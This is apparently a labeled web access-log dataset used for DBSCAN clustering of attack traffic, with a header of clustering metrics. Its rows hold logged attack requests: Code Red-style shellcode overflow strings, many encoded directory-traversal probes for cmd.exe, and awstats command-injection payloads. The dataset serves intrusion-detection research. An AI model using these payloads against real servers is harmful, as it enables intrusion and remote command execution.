#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1108546103,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108546106,"HTTP/1.1",0,"Microsoft-WebDAV-MiniRedir/5.1.2600","OPTIONS","/","'200'",9004249111162,"-","AI","S350","A_8"
1108566124,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9200050011109,"-","AE","S64","A_0"
1108567236,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108572723,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024009145131,"-","AE","S342","A_0"
1108582402,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9141152185177,"-","AE","S16","A_0"
1108589015,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218232208173,"-","AE","S201","A_0"
1108589270,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9061053032222,"-","AA","S413","A_1"
1108590057,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108595831,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9064180246247,"-","AE","S441","A_0"
1108597649,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9080063059010,"-","AE","S568","A_0"
1108600960,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108603647,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603647,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603648,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603648,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603648,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603648,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603649,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603649,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603649,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603649,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603649,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603650,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603650,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9201129065141,"-","AB","S67","A_2"
1108603650,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9201129065141,"-","AB","S67","A_2"
1108603650,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108603651,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9201129065141,"-","AA","S67","A_1"
1108611765,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108617209,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617209,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617209,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617209,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617210,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617210,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617210,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617210,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617211,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617211,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617211,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617211,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617211,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069153013148,"-","AB","S537","A_2"
1108617212,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069153013148,"-","AB","S537","A_2"
1108617212,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108617212,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069153013148,"-","AA","S537","A_1"
1108622026,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108632767,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108640676,"-",1061,"-","GET","/NULL.printer","'404'",9081006250202,"-","AA","S575","A_1"
1108642454,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007243,"-","AE","S376","A_0"
1108653818,"HTTP/1.0",1052,"HTTPClient","GET","http://www.google.com/intl/zh-CN/","'404'",9218007163019,"-","AH","S217","A_12"
1108669790,"-",1061,"-","GET","/NULL.printer","'404'",9061088122010,"-","AA","S417","A_1"
1108670227,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007119,"-","AE","S361","A_0"
1108677223,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9172134023011,"-","AA","S31","A_1"
1108686830,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9209213220227,"-","AE","S120","A_0"
1108708297,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1108708297,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1108708299,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1108708299,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1108708299,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1108708301,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9206049194036,"-","AA","S99","A_1"
1109087499,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087504,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087509,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087513,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087517,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087522,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087526,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087531,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087536,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087541,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087545,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087550,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087555,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9211059000040,"-","AB","S155","A_2"
1109087560,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9211059000040,"-","AB","S155","A_2"
1109087564,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109087569,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9211059000040,"-","AA","S155","A_1"
1109097707,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9069139247161,"-","AE","S536","A_0"
1109104648,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9018241006024,"-","AE","S42","A_0"
1109109182,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218019063215,"-","AE","S191","A_0"
1109120997,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9212059013202,"-","AA","S160","A_1"
1109123885,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9208189245200,"-","AE","S108","A_0"
1109124580,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063245085123,"-","AA","S434","A_1"
1109145758,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9202164101056,"-","AE","S78","A_0"
1109157759,"HTTP/1.1",1050,"-","GET","/scripts/nsiislog.dll","'404'",9081006250202,"-","AA","S575","A_1"
1109162277,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219136113141,"-","AE","S240","A_0"
1109175414,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218088202208,"-","AE","S232","A_0"
1109177170,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063245085123,"-","AA","S434","A_1"
1109188221,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9068143095195,"-","AE","S514","A_0"
1109197136,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197136,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197137,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197137,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197137,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197137,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197138,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197138,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197138,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197139,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197139,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197139,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197139,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069229028252,"-","AB","S543","A_2"
1109197140,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069229028252,"-","AB","S543","A_2"
1109197140,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197140,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069229028252,"-","AA","S543","A_1"
1109197936,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9198031097149,"-","AE","S58","A_0"
1109198671,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061183081129,"-","AE","S400","A_0"
1109202767,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067086096100,"-","AE","S510","A_0"
1109213743,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9012047120130,"-","AE","S4","A_0"
1109215964,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9203084191209,"-","AE","S92","A_0"
1109218192,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218193,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218194,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218194,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218194,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218194,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218194,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9024099140064,"-","AB","S345","A_2"
1109218194,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9024099140064,"-","AB","S345","A_2"
1109218194,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109218195,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9024099140064,"-","AA","S345","A_1"
1109228497,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218018169220,"-","AE","S187","A_0"
1109229403,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229403,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229404,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229405,"HTTP/1.1",1051,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229405,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229405,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229406,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
1109229406,"HTTP/1.1",1050,"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","GET","//cgi/awstats.pl?configdir=|%20id%20|","'404'",9066099250098,"-","AJ","S488","A_13"
